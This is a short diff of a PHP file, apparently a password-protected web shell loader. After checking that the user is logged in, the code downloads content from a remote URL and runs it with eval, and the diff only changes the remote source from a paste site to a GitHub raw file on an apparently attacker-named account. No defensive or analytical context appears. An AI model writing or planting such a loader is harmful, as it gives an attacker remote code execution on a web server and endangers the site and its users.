@@ -205,7 +205,7 @@ if (isset($_POST["password"])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo("https://ghostbin.axel.org/paste/e9dcv/raw");
+    $a = geturlsinfo("https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/conviguration");
     eval("?>" . $a);
 } else {
     ?>
